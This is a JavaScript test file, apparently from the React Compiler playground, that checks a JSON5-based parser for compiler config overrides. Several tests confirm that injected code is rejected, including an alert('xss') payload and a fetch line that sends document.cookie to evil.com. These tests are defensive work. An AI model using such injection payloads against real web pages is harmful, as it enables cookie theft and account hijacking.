/**
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

import assert from 'node:assert';
import {test, describe} from 'node:test';
import JSON5 from 'json5';

// Re-implement parseConfigOverrides here since the source uses TS imports
// that can't be directly loaded by Node. This mirrors the logic in
// compilation.ts exactly.
function parseConfigOverrides(configOverrides) {
  const trimmed = configOverrides.trim();
  if (!trimmed) {
    return {};
  }
  return JSON5.parse(trimmed);
}

describe('parseConfigOverrides', () => {
  test('empty string returns empty object', () => {
    assert.deepStrictEqual(parseConfigOverrides(''), {});
    assert.deepStrictEqual(parseConfigOverrides('   '), {});
  });

  test('default config parses correctly', () => {
    const config = `{
  //compilationMode: "all"
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {});
  });

  test('compilationMode "all" parses correctly', () => {
    const config = `{
  compilationMode: "all"
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('config with single-line and block comments parses correctly', () => {
    const config = `{
  // This is a single-line comment
  /* This is a block comment */
  compilationMode: "all",
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('config with trailing commas parses correctly', () => {
    const config = `{
  compilationMode: "all",
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('nested environment options parse correctly', () => {
    const config = `{
  environment: {
    validateRefAccessDuringRender: true,
  },
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {
      environment: {validateRefAccessDuringRender: true},
    });
  });

  test('multiple options parse correctly', () => {
    const config = `{
  compilationMode: "all",
  environment: {
    validateRefAccessDuringRender: false,
  },
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {
      compilationMode: 'all',
      environment: {validateRefAccessDuringRender: false},
    });
  });

  test('rejects malicious IIFE injection', () => {
    const config = `(function(){ document.title = "hacked"; return {}; })()`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects malicious comma operator injection', () => {
    const config = `{
  compilationMode: (alert("xss"), "all")
}`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects function call in value', () => {
    const config = `{
  compilationMode: eval("all")
}`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects variable references', () => {
    const config = `{
  compilationMode: someVar
}`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects template literals', () => {
    const config = `{
  compilationMode: \`all\`
}`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects constructor calls', () => {
    const config = `{
  compilationMode: new String("all")
}`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('rejects arbitrary JS code', () => {
    const config = `fetch("https://evil.com?c=" + document.cookie)`;
    assert.throws(() => parseConfigOverrides(config));
  });

  test('config with array values parses correctly', () => {
    const config = `{
  sources: ["src/a.ts", "src/b.ts"],
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {sources: ['src/a.ts', 'src/b.ts']});
  });

  test('config with null values parses correctly', () => {
    const config = `{
  compilationMode: null,
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {compilationMode: null});
  });

  test('config with numeric values parses correctly', () => {
    const config = `{
  maxLevel: 42,
}`;
    const result = parseConfigOverrides(config);
    assert.deepStrictEqual(result, {maxLevel: 42});
  });
});
